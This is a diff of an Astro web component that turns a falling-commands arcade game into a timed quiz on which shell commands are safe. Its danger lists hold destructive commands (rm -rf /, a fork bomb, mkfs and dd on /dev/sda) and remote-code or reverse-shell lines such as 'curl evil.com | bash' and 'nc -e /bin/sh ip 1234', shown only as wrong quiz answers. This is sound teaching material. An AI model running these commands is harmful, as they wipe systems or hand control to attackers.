@@ -1,60 +1,77 @@
 ---
-// CaroGame.astro - Atari-style arcade game where Caro catches falling commands
+// CaroGame.astro - "Who Wants to Be Safe?" quiz game featuring Caro
 ---
 
 <section id="game" class="game-section">
   <div class="container">
     <h2>Play with Caro</h2>
     <p class="section-subtitle">
-      Help Caro fetch the safe commands! Avoid the dangerous ones.
+      Test your shell command knowledge! Pick the safe commands, avoid the dangerous ones.
     </p>
 
     <div class="game-wrapper">
-      <div class="arcade-cabinet">
-        <div class="cabinet-top">
-          <div class="score-display">
-            <span class="label">SCORE</span>
-            <span id="score" class="value">0000</span>
+      <div class="quiz-cabinet">
+        <!-- Header -->
+        <div class="quiz-header">
+          <div class="stat">
+            <span class="stat-label">LEVEL</span>
+            <span id="level" class="stat-value">1</span>
           </div>
-          <div class="title-display">CARO FETCH</div>
-          <div class="score-display">
-            <span class="label">HIGH</span>
-            <span id="high-score" class="value">0000</span>
+          <div class="title">SAFE OR DANGER?</div>
+          <div class="stat">
+            <span class="stat-label">SCORE</span>
+            <span id="score" class="stat-value">0</span>
           </div>
         </div>
 
-        <div class="lives-display">
-          <span id="lives">
-            <span class="life">🐕</span>
-            <span class="life">🐕</span>
-            <span class="life">🐕</span>
-          </span>
+        <!-- Progress bar -->
+        <div class="progress-bar">
+          <div id="timer-bar" class="timer-fill"></div>
         </div>
 
-        <div id="game-screen" class="game-screen">
-          <div class="scanlines"></div>
-          <div id="caro" class="caro"></div>
+        <!-- Game area -->
+        <div id="game-area" class="game-area">
+          <!-- Caro in center -->
+          <div class="caro-center">
+            <img src="/caro-pixel.png" alt="Caro" />
+            <div id="caro-speech" class="speech-bubble">Pick the SAFE command!</div>
+          </div>
 
+          <!-- Command options grid -->
+          <div id="options-grid" class="options-grid">
+            <!-- Options will be inserted here -->
+          </div>
+
+          <!-- Overlay -->
           <div id="overlay" class="overlay">
             <div class="overlay-box">
-              <div id="overlay-title" class="title">CARO FETCH</div>
-              <div class="instructions">
-                <p>Catch safe commands, avoid dangerous ones!</p>
+              <div id="overlay-title" class="overlay-title">SAFE OR DANGER?</div>
+              <div id="overlay-subtitle" class="overlay-subtitle">
+                Can you identify which shell commands are safe to run?
               </div>
-              <div class="command-legend">
-                <div class="legend-row"><span class="cmd-preview safe">$ ls -la</span><span>+10</span></div>
-                <div class="legend-row"><span class="cmd-preview bonus">$ git commit</span><span>+25</span></div>
-                <div class="legend-row"><span class="cmd-preview danger">$ rm -rf /</span><span>-1 ❤️</span></div>
+              <div class="rules">
+                <div class="rule safe">✓ Pick SAFE commands to score points</div>
+                <div class="rule danger">✗ Avoid DANGEROUS commands or lose a life</div>
+                <div class="rule timer">⏱ Answer before time runs out!</div>
               </div>
-              <button id="start-btn" class="start-btn">INSERT COIN</button>
-              <p class="hint">← → or A/D to move | SPACE to start</p>
+              <div class="lives-display">
+                <span>Lives:</span>
+                <span id="lives-display">❤️ ❤️ ❤️</span>
+              </div>
+              <button id="start-btn" class="start-btn">START GAME</button>
+              <div id="high-score-display" class="high-score">High Score: <span id="high-score">0</span></div>
             </div>
           </div>
         </div>
 
-        <div class="game-controls">
-          <button id="left-btn" class="ctrl-btn">◀</button>
-          <button id="right-btn" class="ctrl-btn">▶</button>
+        <!-- Lives indicator -->
+        <div class="footer-bar">
+          <div id="lives" class="lives">
+            <span class="heart">❤️</span>
+            <span class="heart">❤️</span>
+            <span class="heart">❤️</span>
+          </div>
+          <div id="streak" class="streak">🔥 Streak: <span id="streak-count">0</span></div>
         </div>
       </div>
     </div>
@@ -72,253 +89,318 @@
     justify-content: center;
   }
 
-  .arcade-cabinet {
+  .quiz-cabinet {
     background: linear-gradient(180deg, #1a1a2e 0%, #0f0f1a 100%);
     border-radius: 16px;
     padding: 20px;
     box-shadow: 0 0 0 4px #ff8c42, 0 0 40px rgba(255, 140, 66, 0.3);
-    max-width: 700px;
+    max-width: 800px;
     width: 100%;
   }
 
-  .cabinet-top {
+  .quiz-header {
     display: flex;
     justify-content: space-between;
     align-items: center;
-    padding: 10px 15px;
-    margin-bottom: 8px;
+    padding: 10px 20px;
+    margin-bottom: 10px;
   }
 
-  .score-display {
+  .stat {
     display: flex;
     flex-direction: column;
     align-items: center;
     font-family: 'Courier New', monospace;
   }
 
-  .score-display .label {
+  .stat-label {
     font-size: 11px;
     color: #ff8c42;
     letter-spacing: 2px;
   }
 
-  .score-display .value {
-    font-size: 22px;
+  .stat-value {
+    font-size: 28px;
     color: #fff;
     font-weight: bold;
     text-shadow: 0 0 10px rgba(255, 140, 66, 0.8);
   }
 
-  .title-display {
-    font-size: 24px;
+  .title {
+    font-size: 22px;
     font-weight: bold;
     color: #ff8c42;
     text-shadow: 0 0 15px rgba(255, 140, 66, 0.8);
-    letter-spacing: 4px;
+    letter-spacing: 3px;
     font-family: 'Courier New', monospace;
   }
 
-  .lives-display {
-    text-align: center;
-    padding: 6px;
-    font-size: 22px;
-  }
-
-  .lives-display .life {
-    margin: 0 3px;
-    transition: all 0.3s;
-    display: inline-block;
-  }
-
-  .lives-display .life.lost {
-    opacity: 0.15;
-    transform: scale(0.6);
-  }
-
-  .game-screen {
-    position: relative;
-    width: 100%;
-    height: 480px;
-    background: radial-gradient(ellipse at center, #0a0a12 0%, #000 100%);
-    border: 3px solid #333;
-    border-radius: 6px;
+  .progress-bar {
+    height: 8px;
+    background: #222;
+    border-radius: 4px;
+    margin: 0 10px 15px;
     overflow: hidden;
   }
 
-  .scanlines {
-    position: absolute;
-    inset: 0;
-    background: repeating-linear-gradient(
-      0deg,
-      transparent 0px,
-      transparent 2px,
-      rgba(0, 0, 0, 0.1) 2px,
-      rgba(0, 0, 0, 0.1) 4px
-    );
-    pointer-events: none;
-    z-index: 1000;
+  .timer-fill {
+    height: 100%;
+    background: linear-gradient(90deg, #2ecc71 0%, #f1c40f 50%, #e74c3c 100%);
+    width: 100%;
+    transition: width 0.1s linear;
+    border-radius: 4px;
   }
 
-  .caro {
-    position: absolute;
-    bottom: 15px;
-    width: 64px;
-    height: 64px;
-    background-image: url('/caro-pixel.png');
-    background-size: contain;
-    background-repeat: no-repeat;
-    background-position: center;
-    image-rendering: pixelated;
-    filter: drop-shadow(0 0 12px rgba(255, 140, 66, 0.6));
+  .timer-fill.warning {
+    animation: pulse-warning 0.5s ease-in-out infinite;
+  }
+
+  @keyframes pulse-warning {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.6; }
+  }
+
+  .game-area {
+    position: relative;
+    min-height: 450px;
+    background: radial-gradient(ellipse at center, #12121a 0%, #0a0a0f 100%);
+    border-radius: 12px;
+    padding: 30px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .caro-center {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin-bottom: 30px;
     z-index: 10;
-    transition: left 0.05s linear;
   }
 
-  .caro.flash {
-    filter: drop-shadow(0 0 20px #fff) brightness(1.5);
+  .caro-center img {
+    width: 80px;
+    height: 80px;
+    image-rendering: pixelated;
+    filter: drop-shadow(0 0 20px rgba(255, 140, 66, 0.6));
+    animation: float 2s ease-in-out infinite;
   }
 
-  .caro.hurt {
-    animation: shake 0.3s ease-out;
+  @keyframes float {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-8px); }
+  }
+
+  .caro-center.correct img {
+    animation: celebrate 0.5s ease-out;
+    filter: drop-shadow(0 0 30px #2ecc71);
+  }
+
+  .caro-center.wrong img {
+    animation: shake 0.5s ease-out;
+    filter: drop-shadow(0 0 30px #e74c3c);
+  }
+
+  @keyframes celebrate {
+    0%, 100% { transform: scale(1) rotate(0); }
+    25% { transform: scale(1.2) rotate(-5deg); }
+    75% { transform: scale(1.2) rotate(5deg); }
   }
 
   @keyframes shake {
     0%, 100% { transform: translateX(0); }
-    25% { transform: translateX(-8px); }
-    75% { transform: translateX(8px); }
+    20%, 60% { transform: translateX(-10px); }
+    40%, 80% { transform: translateX(10px); }
   }
 
-  /* Falling command items */
-  .falling-cmd {
-    position: absolute;
+  .speech-bubble {
+    background: #fff;
+    color: #333;
+    padding: 10px 18px;
+    border-radius: 20px;
     font-family: 'Courier New', monospace;
-    font-size: 13px;
+    font-size: 14px;
     font-weight: bold;
-    padding: 8px 14px;
-    border-radius: 6px;
-    white-space: nowrap;
-    z-index: 5;
-    pointer-events: none;
+    margin-top: 10px;
+    position: relative;
+    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
   }
 
-  .falling-cmd.safe {
-    background: linear-gradient(180deg, #252530 0%, #15151f 100%);
-    border: 2px solid #ff8c42;
-    color: #ff8c42;
-    box-shadow: 0 0 12px rgba(255, 140, 66, 0.5), inset 0 1px 0 rgba(255,255,255,0.1);
+  .speech-bubble::before {
+    content: '';
+    position: absolute;
+    top: -8px;
+    left: 50%;
+    transform: translateX(-50%);
+    border: 8px solid transparent;
+    border-bottom-color: #fff;
+    border-top: 0;
   }
 
-  .falling-cmd.bonus {
-    background: linear-gradient(180deg, #1a2f1a 0%, #0a1f0a 100%);
-    border: 2px solid #2ecc71;
+  .speech-bubble.correct {
+    background: #2ecc71;
+    color: #fff;
+  }
+
+  .speech-bubble.wrong {
+    background: #e74c3c;
+    color: #fff;
+  }
+
+  .speech-bubble.correct::before { border-bottom-color: #2ecc71; }
+  .speech-bubble.wrong::before { border-bottom-color: #e74c3c; }
+
+  .options-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 15px;
+    width: 100%;
+    max-width: 600px;
+  }
+
+  .option-btn {
+    background: linear-gradient(180deg, #252535 0%, #1a1a28 100%);
+    border: 3px solid #444;
+    border-radius: 12px;
+    padding: 18px 20px;
+    font-family: 'Courier New', monospace;
+    font-size: 15px;
+    color: #ddd;
+    cursor: pointer;
+    transition: all 0.15s ease;
+    text-align: left;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .option-btn:hover:not(:disabled) {
+    border-color: #ff8c42;
+    background: linear-gradient(180deg, #2a2a3a 0%, #1f1f2d 100%);
+    transform: translateY(-2px);
+    box-shadow: 0 5px 20px rgba(255, 140, 66, 0.3);
+  }
+
+  .option-btn:disabled {
+    cursor: not-allowed;
+    opacity: 0.7;
+  }
+
+  .option-btn.safe-reveal {
+    border-color: #2ecc71;
+    background: linear-gradient(180deg, #1a3a2a 0%, #0f2a1a 100%);
     color: #2ecc71;
-    box-shadow: 0 0 16px rgba(46, 204, 113, 0.6), inset 0 1px 0 rgba(255,255,255,0.1);
-    animation: glow-green 0.5s ease-in-out infinite alternate;
   }
 
-  @keyframes glow-green {
-    from { box-shadow: 0 0 12px rgba(46, 204, 113, 0.5); }
-    to { box-shadow: 0 0 22px rgba(46, 204, 113, 0.9); }
-  }
-
-  .falling-cmd.danger {
-    background: linear-gradient(180deg, #2f1a1a 0%, #1f0a0a 100%);
-    border: 2px solid #e74c3c;
+  .option-btn.danger-reveal {
+    border-color: #e74c3c;
+    background: linear-gradient(180deg, #3a1a1a 0%, #2a0f0f 100%);
     color: #e74c3c;
-    box-shadow: 0 0 16px rgba(231, 76, 60, 0.6), inset 0 1px 0 rgba(255,255,255,0.1);
-    animation: glow-red 0.3s ease-in-out infinite alternate;
   }
 
-  @keyframes glow-red {
-    from { box-shadow: 0 0 12px rgba(231, 76, 60, 0.5); }
-    to { box-shadow: 0 0 24px rgba(231, 76, 60, 1); }
+  .option-btn.selected-correct {
+    border-color: #2ecc71;
+    background: #2ecc71;
+    color: #fff;
+    animation: pop 0.3s ease-out;
   }
 
-  .falling-cmd::before {
+  .option-btn.selected-wrong {
+    border-color: #e74c3c;
+    background: #e74c3c;
+    color: #fff;
+    animation: shake 0.3s ease-out;
+  }
+
+  @keyframes pop {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.05); }
+  }
+
+  .option-btn::before {
     content: '$ ';
-    opacity: 0.6;
+    color: #666;
   }
 
-  /* Score popup */
-  .popup {
+  .option-label {
     position: absolute;
-    font-family: 'Courier New', monospace;
-    font-size: 22px;
+    top: 5px;
+    left: 10px;
+    font-size: 11px;
+    color: #666;
     font-weight: bold;
-    pointer-events: none;
-    z-index: 100;
-    text-shadow: 0 0 10px currentColor;
   }
 
   /* Overlay */
   .overlay {
     position: absolute;
     inset: 0;
-    background: rgba(0, 0, 0, 0.9);
+    background: rgba(0, 0, 0, 0.95);
     display: flex;
     justify-content: center;
     align-items: center;
-    z-index: 500;
+    z-index: 100;
+    border-radius: 12px;
   }
 
   .overlay.hidden { display: none; }
 
   .overlay-box {
     text-align: center;
-    color: #fff;
+    padding: 30px;
     font-family: 'Courier New', monospace;
   }
 
-  .overlay-box .title {
+  .overlay-title {
     font-size: 32px;
     color: #ff8c42;
-    margin-bottom: 15px;
+    margin-bottom: 10px;
     text-shadow: 0 0 20px rgba(255, 140, 66, 0.8);
-    letter-spacing: 3px;
+    letter-spacing: 2px;
   }
 
-  .overlay-box .instructions {
-    margin-bottom: 20px;
+  .overlay-subtitle {
     color: #aaa;
-  }
-
-  .command-legend {
     margin-bottom: 25px;
-  }
-
-  .legend-row {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    gap: 12px;
-    margin: 8px 0;
     font-size: 14px;
   }
 
-  .cmd-preview {
-    font-size: 11px;
-    padding: 4px 10px;
-    border-radius: 4px;
-    min-width: 90px;
+  .rules {
+    margin-bottom: 25px;
     text-align: left;
+    display: inline-block;
   }
 
-  .cmd-preview.safe {
-    background: #15151f;
-    border: 2px solid #ff8c42;
-    color: #ff8c42;
+  .rule {
+    padding: 8px 15px;
+    margin: 5px 0;
+    border-radius: 6px;
+    font-size: 13px;
   }
 
-  .cmd-preview.bonus {
-    background: #0a1f0a;
-    border: 2px solid #2ecc71;
+  .rule.safe {
+    background: rgba(46, 204, 113, 0.2);
     color: #2ecc71;
+    border-left: 3px solid #2ecc71;
   }
 
-  .cmd-preview.danger {
-    background: #1f0a0a;
-    border: 2px solid #e74c3c;
+  .rule.danger {
+    background: rgba(231, 76, 60, 0.2);
     color: #e74c3c;
+    border-left: 3px solid #e74c3c;
+  }
+
+  .rule.timer {
+    background: rgba(241, 196, 15, 0.2);
+    color: #f1c40f;
+    border-left: 3px solid #f1c40f;
+  }
+
+  .lives-display {
+    margin-bottom: 20px;
+    font-size: 18px;
+    color: #fff;
   }
 
   .start-btn {
@@ -326,20 +408,20 @@
     border: none;
     color: #fff;
     font-family: 'Courier New', monospace;
-    font-size: 18px;
+    font-size: 20px;
     font-weight: bold;
-    padding: 14px 36px;
-    border-radius: 8px;
+    padding: 16px 50px;
+    border-radius: 10px;
     cursor: pointer;
     text-transform: uppercase;
     letter-spacing: 2px;
-    box-shadow: 0 4px 0 #b35c20, 0 0 20px rgba(255, 140, 66, 0.4);
+    box-shadow: 0 4px 0 #b35c20, 0 0 25px rgba(255, 140, 66, 0.4);
     transition: all 0.1s;
   }
 
   .start-btn:hover {
     transform: translateY(-2px);
-    box-shadow: 0 6px 0 #b35c20, 0 0 30px rgba(255, 140, 66, 0.6);
+    box-shadow: 0 6px 0 #b35c20, 0 0 35px rgba(255, 140, 66, 0.6);
   }
 
   .start-btn:active {
@@ -347,292 +429,372 @@
     box-shadow: 0 2px 0 #b35c20;
   }
 
-  .hint {
-    margin-top: 16px;
-    color: #555;
-    font-size: 11px;
+  .high-score {
+    margin-top: 20px;
+    color: #666;
+    font-size: 14px;
   }
 
-  .game-controls {
+  .footer-bar {
     display: flex;
-    justify-content: center;
-    gap: 30px;
-    margin-top: 16px;
+    justify-content: space-between;
+    align-items: center;
+    padding: 15px 20px;
+    margin-top: 10px;
   }
 
-  .ctrl-btn {
-    width: 70px;
-    height: 50px;
+  .lives {
+    display: flex;
+    gap: 8px;
     font-size: 24px;
-    background: linear-gradient(180deg, #2a2a3a 0%, #1a1a2a 100%);
-    color: #ff8c42;
-    border: 2px solid #ff8c42;
-    border-radius: 8px;
-    cursor: pointer;
-    box-shadow: 0 3px 0 #111;
-    transition: all 0.1s;
   }
 
-  .ctrl-btn:active {
-    transform: translateY(2px);
-    box-shadow: 0 1px 0 #111;
+  .lives .heart {
+    transition: all 0.3s;
+  }
+
+  .lives .heart.lost {
+    filter: grayscale(1);
+    opacity: 0.3;
+    transform: scale(0.8);
+  }
+
+  .streak {
+    font-family: 'Courier New', monospace;
+    font-size: 16px;
+    color: #f1c40f;
   }
 
   @media (max-width: 600px) {
-    .game-screen { height: 380px; }
-    .caro { width: 50px; height: 50px; }
-    .title-display { font-size: 18px; letter-spacing: 2px; }
-    .falling-cmd { font-size: 11px; padding: 6px 10px; }
+    .options-grid {
+      grid-template-columns: 1fr;
+    }
+
+    .game-area {
+      min-height: 500px;
+      padding: 20px;
+    }
+
+    .option-btn {
+      font-size: 13px;
+      padding: 14px 16px;
+    }
+
+    .title {
+      font-size: 16px;
+      letter-spacing: 1px;
+    }
+
+    .overlay-title {
+      font-size: 24px;
+    }
   }
 </style>
 
 <script>
   (function() {
-    const screen = document.getElementById('game-screen');
-    const caroEl = document.getElementById('caro');
+    // Elements
+    const gameArea = document.getElementById('game-area');
+    const optionsGrid = document.getElementById('options-grid');
     const overlay = document.getElementById('overlay');
     const overlayTitle = document.getElementById('overlay-title');
+    const overlaySubtitle = document.getElementById('overlay-subtitle');
     const startBtn = document.getElementById('start-btn');
+    const levelEl = document.getElementById('level');
     const scoreEl = document.getElementById('score');
     const highScoreEl = document.getElementById('high-score');
     const livesEl = document.getElementById('lives');
-    const leftBtn = document.getElementById('left-btn');
-    const rightBtn = document.getElementById('right-btn');
+    const livesDisplayEl = document.getElementById('lives-display');
+    const timerBar = document.getElementById('timer-bar');
+    const caroCenter = document.querySelector('.caro-center');
+    const caroSpeech = document.getElementById('caro-speech');
+    const streakEl = document.getElementById('streak-count');
 
-    if (!screen || !caroEl || !overlay || !startBtn) return;
+    if (!optionsGrid || !overlay || !startBtn) return;
 
-    // Config
-    const CARO_W = 64;
-    let screenW = screen.offsetWidth;
-    let screenH = screen.offsetHeight;
+    // Commands database - categorized by difficulty
+    const commands = {
+      safe: {
+        easy: ['ls', 'pwd', 'cd ~', 'echo "hi"', 'cat file.txt', 'mkdir test', 'touch file', 'cp a b', 'head -5 log', 'tail -f log'],
+        medium: ['grep "text" file', 'find . -name "*.js"', 'chmod +x script.sh', 'ps aux', 'df -h', 'du -sh *', 'tar -xf archive.tar', 'curl localhost', 'wget url', 'ssh user@host'],
+        hard: ['awk \'{print $1}\'', 'sed \'s/a/b/g\'', 'xargs -I{} echo {}', 'sort | uniq -c', 'cut -d: -f1', 'tee output.log', 'rsync -av src/ dst/', 'screen -S session', 'nohup ./run.sh &', 'crontab -l']
+      },
+      danger: {
+        easy: ['rm -rf /', 'rm -rf ~', 'rm -rf *', ':(){:|:&};:', 'sudo rm -rf /', 'mv /* /dev/null'],
+        medium: ['chmod 777 /', 'mkfs.ext4 /dev/sda', 'dd if=/dev/zero of=/dev/sda', 'echo "" > /etc/passwd', '> /var/log/*', 'chmod -R 000 /'],
+        hard: ['curl evil.com | bash', 'wget -O- bad.sh | sh', 'python -c "import os;os.system(\'rm -rf /\')"', 'eval $(decode payload)', 'nc -e /bin/sh ip 1234', 'cat /dev/urandom > /dev/sda']
+      }
+    };
 
-    // State
-    let running = false;
+    const messages = {
+      correct: ['Great job! 🎉', 'Correct! ✓', 'You know your stuff!', 'Safe choice! 👍', 'Well done!', 'Excellent! 🌟'],
+      wrong: ['Oops! That\'s dangerous! 💥', 'Watch out! ⚠️', 'That could wipe your system!', 'Dangerous! Never run that!', 'Yikes! Bad command!'],
+      timeout: ['Too slow! ⏱', 'Time\'s up!', 'Gotta be faster!'],
+      start: ['Pick the SAFE command!', 'Which one is safe?', 'Find the safe command!', 'Choose wisely!']
+    };
+
+    // Game state
+    let level = 1;
     let score = 0;
     let lives = 3;
-    let caroX = screenW / 2 - CARO_W / 2;
-    let highScore = parseInt(localStorage.getItem('caroHigh') || '0');
-    let commands: { el: HTMLElement; x: number; y: number; w: number; h: number; speed: number; type: string }[] = [];
-    let lastSpawn = 0;
-    let spawnInterval = 1500;
-    let baseSpeed = 2.5;
-    let lastTime = 0;
+    let streak = 0;
+    let highScore = parseInt(localStorage.getItem('caroQuizHigh') || '0');
+    let timer: number | null = null;
+    let timeLeft = 100;
+    let playing = false;
+    let currentOptions: { cmd: string; safe: boolean }[] = [];
 
-    // Commands
-    const safeCmds = ['ls -la', 'pwd', 'cat file', 'mkdir dir', 'grep hi', 'find .', 'echo hi', 'cd ~', 'touch f', 'head -5', 'tail -f', 'wc -l', 'chmod +x', 'ps aux', 'df -h', 'curl', 'wget'];
-    const dangerCmds = ['rm -rf /', 'rm -rf ~', 'sudo rm', ':(){:|:&};:', 'mkfs', 'dd zero'];
-    const bonusCmds = ['git commit', 'cargo build', 'npm run', 'docker up'];
+    // Init
+    highScoreEl!.textContent = String(highScore);
 
-    // Init display
-    highScoreEl!.textContent = String(highScore).padStart(4, '0');
-    caroEl.style.left = caroX + 'px';
-
-    function resize() {
-      screenW = screen.offsetWidth;
-      screenH = screen.offsetHeight;
-      if (caroX > screenW - CARO_W - 10) {
-        caroX = screenW - CARO_W - 10;
-        caroEl.style.left = caroX + 'px';
-      }
+    function getDifficulty(): 'easy' | 'medium' | 'hard' {
+      if (level <= 3) return 'easy';
+      if (level <= 7) return 'medium';
+      return 'hard';
     }
-    window.addEventListener('resize', resize);
+
+    function getTimeLimit(): number {
+      // Less time as level increases
+      return Math.max(4000, 10000 - (level - 1) * 600);
+    }
+
+    function getOptionCount(): number {
+      // More options as level increases
+      if (level <= 2) return 2;
+      if (level <= 5) return 3;
+      return 4;
+    }
+
+    function shuffle<T>(arr: T[]): T[] {
+      const a = [...arr];
+      for (let i = a.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [a[i], a[j]] = [a[j], a[i]];
+      }
+      return a;
+    }
+
+    function pickRandom<T>(arr: T[]): T {
+      return arr[Math.floor(Math.random() * arr.length)];
+    }
+
+    function generateOptions(): { cmd: string; safe: boolean }[] {
+      const diff = getDifficulty();
+      const count = getOptionCount();
+
+      // Always have exactly 1 safe command
+      const safeCmd = pickRandom(commands.safe[diff]);
+
+      // Fill rest with danger commands
+      const dangerCmds = shuffle(commands.danger[diff]).slice(0, count - 1);
+
+      const options = [
+        { cmd: safeCmd, safe: true },
+        ...dangerCmds.map(cmd => ({ cmd, safe: false }))
+      ];
+
+      return shuffle(options);
+    }
 
     function updateLives() {
-      const dogs = livesEl!.querySelectorAll('.life');
-      dogs.forEach((d, i) => d.classList.toggle('lost', i >= lives));
+      const hearts = livesEl!.querySelectorAll('.heart');
+      hearts.forEach((h, i) => h.classList.toggle('lost', i >= lives));
+      livesDisplayEl!.textContent = '❤️ '.repeat(lives).trim() || '💔';
     }
 
-    function spawn(time: number) {
-      if (time - lastSpawn < spawnInterval) return;
-      lastSpawn = time;
+    function showQuestion() {
+      currentOptions = generateOptions();
+      optionsGrid!.innerHTML = '';
 
-      // Increase difficulty
-      if (spawnInterval > 600) spawnInterval -= 15;
-      if (baseSpeed < 6) baseSpeed += 0.03;
+      const labels = ['A', 'B', 'C', 'D'];
 
-      const r = Math.random();
-      let type: string, list: string[];
-      if (r < 0.12) { type = 'danger'; list = dangerCmds; }
-      else if (r < 0.22) { type = 'bonus'; list = bonusCmds; }
-      else { type = 'safe'; list = safeCmds; }
-
-      const text = list[Math.floor(Math.random() * list.length)];
-      const el = document.createElement('div');
-      el.className = `falling-cmd ${type}`;
-      el.textContent = text;
-      screen.appendChild(el);
-
-      const w = el.offsetWidth;
-      const h = el.offsetHeight;
-      const x = 20 + Math.random() * (screenW - w - 40);
-      const speed = baseSpeed + Math.random() * 1.5;
-
-      el.style.left = x + 'px';
-      el.style.top = '-50px';
-
-      commands.push({ el, x, y: -50, w, h, speed, type });
-    }
-
-    function showPopup(text: string, color: string, x: number, y: number) {
-      const p = document.createElement('div');
-      p.className = 'popup';
-      p.textContent = text;
-      p.style.left = x + 'px';
-      p.style.top = y + 'px';
-      p.style.color = color;
-      p.style.animation = 'popAnim 0.5s ease-out forwards';
-      screen.appendChild(p);
-      setTimeout(() => p.remove(), 500);
-    }
-
-    function collides(cmd: typeof commands[0]): boolean {
-      const caroTop = screenH - 64 - 15;
-      const caroBottom = screenH - 15;
-      const caroLeft = caroX;
-      const caroRight = caroX + CARO_W;
-
-      const cmdBottom = cmd.y + cmd.h;
-      const cmdRight = cmd.x + cmd.w;
-
-      return cmdBottom >= caroTop && cmd.y <= caroBottom && cmdRight >= caroLeft && cmd.x <= caroRight;
-    }
-
-    function gameLoop(time: number) {
-      if (!running) return;
-
-      const dt = Math.min((time - lastTime) / 16.67, 3); // normalize to ~60fps
-      lastTime = time;
-
-      spawn(time);
-
-      commands = commands.filter(cmd => {
-        cmd.y += cmd.speed * dt;
-        cmd.el.style.top = cmd.y + 'px';
-
-        if (collides(cmd)) {
-          if (cmd.type === 'safe') {
-            score += 10;
-            showPopup('+10', '#ff8c42', cmd.x + cmd.w/2 - 15, cmd.y);
-            caroEl.classList.add('flash');
-            setTimeout(() => caroEl.classList.remove('flash'), 150);
-          } else if (cmd.type === 'bonus') {
-            score += 25;
-            showPopup('+25', '#2ecc71', cmd.x + cmd.w/2 - 15, cmd.y);
-            caroEl.classList.add('flash');
-            setTimeout(() => caroEl.classList.remove('flash'), 150);
-          } else {
-            lives--;
-            showPopup('OUCH!', '#e74c3c', cmd.x + cmd.w/2 - 25, cmd.y);
-            caroEl.classList.add('hurt');
-            setTimeout(() => caroEl.classList.remove('hurt'), 300);
-            updateLives();
-            if (lives <= 0) { endGame(); return false; }
-          }
-          scoreEl!.textContent = String(score).padStart(4, '0');
-          cmd.el.remove();
-          return false;
-        }
-
-        if (cmd.y > screenH + 20) {
-          if (cmd.type !== 'danger') {
-            lives--;
-            updateLives();
-            if (lives <= 0) endGame();
-          }
-          cmd.el.remove();
-          return false;
-        }
-
-        return true;
+      currentOptions.forEach((opt, i) => {
+        const btn = document.createElement('button');
+        btn.className = 'option-btn';
+        btn.innerHTML = `<span class="option-label">${labels[i]}</span>${opt.cmd}`;
+        btn.addEventListener('click', () => handleAnswer(i, btn));
+        optionsGrid!.appendChild(btn);
       });
 
-      requestAnimationFrame(gameLoop);
+      // Reset Caro
+      caroCenter!.classList.remove('correct', 'wrong');
+      caroSpeech!.classList.remove('correct', 'wrong');
+      caroSpeech!.textContent = pickRandom(messages.start);
+
+      // Start timer
+      timeLeft = 100;
+      timerBar!.style.width = '100%';
+      timerBar!.classList.remove('warning');
+
+      const timeLimit = getTimeLimit();
+      const interval = 50;
+      const decrement = 100 / (timeLimit / interval);
+
+      timer = window.setInterval(() => {
+        timeLeft -= decrement;
+        timerBar!.style.width = Math.max(0, timeLeft) + '%';
+
+        if (timeLeft <= 30) {
+          timerBar!.classList.add('warning');
+        }
+
+        if (timeLeft <= 0) {
+          clearInterval(timer!);
+          handleTimeout();
+        }
+      }, interval);
+    }
+
+    function handleAnswer(index: number, btn: HTMLButtonElement) {
+      if (!playing) return;
+
+      clearInterval(timer!);
+
+      const selected = currentOptions[index];
+      const buttons = optionsGrid!.querySelectorAll('.option-btn');
+
+      // Disable all buttons
+      buttons.forEach(b => (b as HTMLButtonElement).disabled = true);
+
+      // Reveal all answers
+      currentOptions.forEach((opt, i) => {
+        const b = buttons[i];
+        if (opt.safe) {
+          b.classList.add('safe-reveal');
+        } else {
+          b.classList.add('danger-reveal');
+        }
+      });
+
+      if (selected.safe) {
+        // Correct!
+        btn.classList.add('selected-correct');
+        caroCenter!.classList.add('correct');
+        caroSpeech!.classList.add('correct');
+        caroSpeech!.textContent = pickRandom(messages.correct);
+
+        // Score based on time and level
+        const timeBonus = Math.floor(timeLeft / 10);
+        const levelBonus = level * 5;
+        const points = 10 + timeBonus + levelBonus;
+        score += points;
+        streak++;
+
+        scoreEl!.textContent = String(score);
+        streakEl!.textContent = String(streak);
+
+        setTimeout(() => {
+          level++;
+          levelEl!.textContent = String(level);
+          showQuestion();
+        }, 1500);
+      } else {
+        // Wrong!
+        btn.classList.add('selected-wrong');
+        caroCenter!.classList.add('wrong');
+        caroSpeech!.classList.add('wrong');
+        caroSpeech!.textContent = pickRandom(messages.wrong);
+
+        lives--;
+        streak = 0;
+        streakEl!.textContent = '0';
+        updateLives();
+
+        if (lives <= 0) {
+          setTimeout(endGame, 1500);
+        } else {
+          setTimeout(showQuestion, 2000);
+        }
+      }
+    }
+
+    function handleTimeout() {
+      if (!playing) return;
+
+      const buttons = optionsGrid!.querySelectorAll('.option-btn');
+      buttons.forEach(b => (b as HTMLButtonElement).disabled = true);
+
+      // Reveal answers
+      currentOptions.forEach((opt, i) => {
+        const b = buttons[i];
+        if (opt.safe) {
+          b.classList.add('safe-reveal');
+        } else {
+          b.classList.add('danger-reveal');
+        }
+      });
+
+      caroCenter!.classList.add('wrong');
+      caroSpeech!.classList.add('wrong');
+      caroSpeech!.textContent = pickRandom(messages.timeout);
+
+      lives--;
+      streak = 0;
+      streakEl!.textContent = '0';
+      updateLives();
+
+      if (lives <= 0) {
+        setTimeout(endGame, 1500);
+      } else {
+        setTimeout(showQuestion, 2000);
+      }
     }
 
     function startGame() {
-      resize();
-      running = true;
+      playing = true;
+      level = 1;
       score = 0;
       lives = 3;
-      spawnInterval = 1500;
-      baseSpeed = 2.5;
-      lastSpawn = 0;
-      lastTime = performance.now();
+      streak = 0;
 
-      caroX = screenW / 2 - CARO_W / 2;
-      caroEl.style.left = caroX + 'px';
-
-      commands.forEach(c => c.el.remove());
-      commands = [];
-
-      scoreEl!.textContent = '0000';
+      levelEl!.textContent = '1';
+      scoreEl!.textContent = '0';
+      streakEl!.textContent = '0';
       updateLives();
-      overlay.classList.add('hidden');
 
-      requestAnimationFrame(gameLoop);
